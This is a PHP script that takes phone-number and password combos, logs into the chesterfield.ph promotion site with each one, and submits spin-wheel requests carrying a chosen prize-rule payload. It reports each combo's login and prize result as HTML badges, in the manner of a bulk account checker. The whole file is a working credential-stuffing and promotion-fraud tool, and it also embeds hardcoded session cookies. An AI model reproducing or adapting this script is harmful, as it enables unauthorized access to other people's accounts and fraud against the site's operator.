<?php
// SCRIPT CREATED BY JEROME LALIAG //

# HIDE ERRORS
error_reporting(0);

# HEADERS
header("Content-Type: text/plain");

# GET STRING FUNCTION
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

# MULTIEXPLODE FUNCTION
function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

# RANDOM PRIZE
$prize = [
    '{"campaign_id":"8ad57de1-07f7-4246-a021-178c903c3ce1","rulesId":["c403d37a-a205-4629-a86a-205c8353b99e","dc2c6e33-5672-453b-9a77-612294f93245","a08a553e-bc2d-44e6-9cce-cf6e76dd6a51","ac8a6c2c-f7c3-4b68-b61a-dca505082339","27be00e4-124f-4639-95b1-4f98b50f7220","9ddb3abb-1bfc-4d8e-a248-f3cd63069659","302d2544-a944-4bfe-953e-e8ae00a852a5","3a9acb56-1460-4492-99f3-e28086bddff3","93a31c75-17be-426d-b7b7-b15646816672"]}',
    '{"campaign_id":"8ad57de1-07f7-4246-a021-178c903c3ce1","rulesId":["c403d37a-a205-4629-a86a-205c8353b99e","dc2c6e33-5672-453b-9a77-612294f93245","a08a553e-bc2d-44e6-9cce-cf6e76dd6a51","ac8a6c2c-f7c3-4b68-b61a-dca505082339","27be00e4-124f-4639-95b1-4f98b50f7220","9ddb3abb-1bfc-4d8e-a248-f3cd63069659","302d2544-a944-4bfe-953e-e8ae00a852a5","3f59fd6b-8873-48eb-959a-fcb4c0003df0","93a31c75-17be-426d-b7b7-b15646816672"]}',
    '{"campaign_id":"8ad57de1-07f7-4246-a021-178c903c3ce1","rulesId":["c403d37a-a205-4629-a86a-205c8353b99e","dc2c6e33-5672-453b-9a77-612294f93245","a08a553e-bc2d-44e6-9cce-cf6e76dd6a51","ac8a6c2c-f7c3-4b68-b61a-dca505082339","27be00e4-124f-4639-95b1-4f98b50f7220","9ddb3abb-1bfc-4d8e-a248-f3cd63069659","302d2544-a944-4bfe-953e-e8ae00a852a5","e46d72b9-3a15-4a8f-b123-c2c6dbfac260","93a31c75-17be-426d-b7b7-b15646816672"]}'
];
# GENERATE RANDOM ARRAY
$random = $prize[array_rand($prize)];

# IF BLANK EXIT
if ($_GET["list"] == "") {
    exit();
}

# EXTRACT DATA
$list   = $_GET["list"];
$number = multiexplode(array(":", " ", "|", ""), $list)[0];
$number = ltrim($number, '0');
$password = multiexplode(array(":", " ", "|", ""), $list)[1];

# LOGIN ACCOUNT
$url  = "https://chesterfield.ph/auth-api/LoginFrontEndSitefinity";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_TIMEOUT, 60);
$headers = array(
    "Sec-Ch-Ua: \"Not A(Brand\";v=\"24\", \"Chromium\";v=\"110\"",
    "Accept: application/json, text/plain, */*",
    "Content-Type: application/json;charset=UTF-8",
    "Sec-Ch-Ua-Mobile: ?0",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
    "Sec-Ch-Ua-Platform: \"Windows\"",
    "Origin: https://chesterfield.ph",
    "Sec-Fetch-Site: same-origin",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Dest: empty",
    "Referer: https://chesterfield.ph/login",
    "Accept-Language: en-US,en;q=0.9"
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = '{"$error":{},"$name":"LoginForm","$dirty":true,"$pristine":false,"$valid":true,"$invalid":false,"$submitted":false,"PhoneNumber":"+63' . $number . '","password":{"$viewValue":"","$modelValue":"","$validators":{},"$asyncValidators":{},"$parsers":[],"$formatters":[null],"$viewChangeListeners":[],"$untouched":false,"$touched":true,"$pristine":false,"$dirty":true,"$valid":true,"$invalid":false,"$error":{},"$name":"password","$options":{}},"Password":"' . $password . '"}';
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
$resp = curl_exec($curl);
curl_close($curl);

# EXTRACT STRINGS
$token   = GetStr($resp, '"Token":"', '"');
$cookie0 = str_replace("/", "%2F", $token);
$cookie  = str_replace("+", "%2B", $cookie0);

# IF TOKEN BLANK ERROR LOGIN
if ($token == "") {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - Error Login </span>&nbsp;<br/>';
    exit();
}

# SPIN
$url  = "https://chesterfield.ph/api/EMS/ExecuteSpinWheelCustomPrize";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_TIMEOUT, 60);
$headers = array(
    "Cookie: sf-prs-ss=638125763913220000; sf-prs-lu=https://chesterfield.ph/; OptanonAlertBoxClosed=2023-02-21T11:39:55.722Z; SF-TokenId=3cb3db23-3053-4cfb-9de3-b2f95e942c19; .AspNet.Cookies=qe0n3rQhqdBiPJ8DNcH7WIAwW0MNSkmrq8oNjPrDU-hNSfokmQFkHbOx8I9emlBOipMCaG20B-o_sLEgBu0a12HtDD6W6xYzVKmTbzwb3pyWKZLDlBpbj5loHkl1esjGGYU6TY5kIk0a3EB5D13co5bT6OjjXzFVhlZxxzxqjt_2crvuFKk4qEOPkT3mJ1QWccCs12pU_sDKHBGaff4FQWg8WnmJKpmdbdzKx3VJmcikb9z_EsrASUrLPUNvIdgYQUgPCwj9Ejpl-6r_IJVimvpfNuWjPoPw9yNlOvMGmXMGGnQ3OoFBfeP1LAQ_LcgUhoH39OYo2Eg7NRBn9VAzSsEEVyEC7Z7WrupGPKFn-fO4udRVLRzb7sa0orjuiNr109sHZL2BLIO-YTly_tQPVsjlSkXm-D3qqm4GU6bwJWRzWXab6RVFmprg87Z1ZaFB52oCe1T1NNx2s9AM4S8NszmWj430oXNurgPBH8iCzK22RONzNxGIi5Hx7CFLzkIEUDHSyRnsMJzQvWIFyACc0ZGZCUeoz-uFMyEgXnhIJ_Eudqmf56Pogt-6vd4VPes-nJGQ70Y1Tsh0SjAlDOZysK-_fXVFZ_RBt0PS0Ql3pmFVXwmYg0G9eHJ9e-Usy4Gd8zA35JxJzn0OWmBOQT4p6qLOlTBWw6kWeMOoy_QrAuuGynp5b62xlYMG0XwdsAGonlOZ8WMzY-AcTF3hM3nCdIjmaVDvIuKXjUPp8CTxmpsKL8CDimmDRGsU5CaKuy4a0i86vw; token_che_session_prd=$cookie; _ga=GA1.2.1108875845.1676979617; _gid=GA1.2.594194508.1676979617; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Feb+21+2023+19%3A40%3A17+GMT%2B0800+(Philippine+Standard+Time)&version=6.39.0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1&geolocation=%3B&AwaitingReconsent=false; AWSALB=Vz09jVkAmO+c/cHxd6lJWnntIHSOWiM5x87Wbn9rmFMy2PqIbfaqbDUNkO9JNpQ53cUQvhbTvMR/VEKogZaOlDL3xrf3eqmwA05q4fK1zA/fMYLHGm80kcJtPA+2; AWSALBCORS=Vz09jVkAmO+c/cHxd6lJWnntIHSOWiM5x87Wbn9rmFMy2PqIbfaqbDUNkO9JNpQ53cUQvhbTvMR/VEKogZaOlDL3xrf3eqmwA05q4fK1zA/fMYLHGm80kcJtPA+2; _gat_UA-110671765-22=1",
    "Sec-Ch-Ua: \"Not A(Brand\";v=\"24\", \"Chromium\";v=\"110\"",
    "Accept: application/json, text/plain, */*",
    "Content-Type: application/json;charset=UTF-8",
    "Sec-Ch-Ua-Mobile: ?0",
    "Authorization: Basic $token",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
    "Sec-Ch-Ua-Platform: \"Windows\"",
    "Origin: https://chesterfield.ph",
    "Sec-Fetch-Site: same-origin",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Dest: empty",
    "Referer: https://chesterfield.ph/homepage/custom-spin-wheel",
    "Accept-Language: en-US,en;q=0.9"
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, $random);
$resp = curl_exec($curl);
curl_close($curl);

# EXTRACT STRINGS
$msgstatus = GetStr($resp, '"Message":"', '"');
$prizename = GetStr($resp, '"prize_name":"', '"');

# CUSTOM RESPONSE
if ($msgstatus == "loss") {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - ' . $msgstatus . ' - ' . $prizename . '</span>&nbsp;<br/>';
    exit();
}

if ($msgstatus == "win") {
    echo '<!-- Result --><span class="badge badge-success">' . $list . ' - ' . $msgstatus . ' - ' . $prizename . '</span>&nbsp;<br/>';
    exit();
}

if ($msgstatus == "draw") {
    echo '<!-- Result --><span class="badge badge-success">' . $list . ' - ' . $msgstatus . ' - ' . $prizename . '</span>&nbsp;<br/>';
    exit();
}

if ($msgstatus == "win limit reached") {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - ' . $msgstatus . ' - ' . $prizename . '</span>&nbsp;<br/>';
    exit();
}

if ($msgstatus == "Daily Limit Reached") {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - ' . $msgstatus . '</span>&nbsp;<br/>';
    exit();
}

if ($msgstatus == "giid not verified") {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - ' . $msgstatus . '</span>&nbsp;<br/>';
    exit();
}

if ($msgstatus == "not enough coin") {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - ' . $msgstatus . '</span>&nbsp;<br/>';
    exit();
}

if ($resp == '"Unauthorize or you are login in other device!"') {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - Unauthorize or you are login in other device!</span>&nbsp;<br/>';
    exit();
}

if ($resp == '{"IsSuccess":false,"Message":null,"Data":null}') {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - Error!</span>&nbsp;<br/>';
    exit();
}

if ($msgstatus == "null,") {
    echo '<!-- Result --><span class="badge badge-danger">' . $list . ' - Unknown Error</span>&nbsp;<br/>';
    exit();
}
?>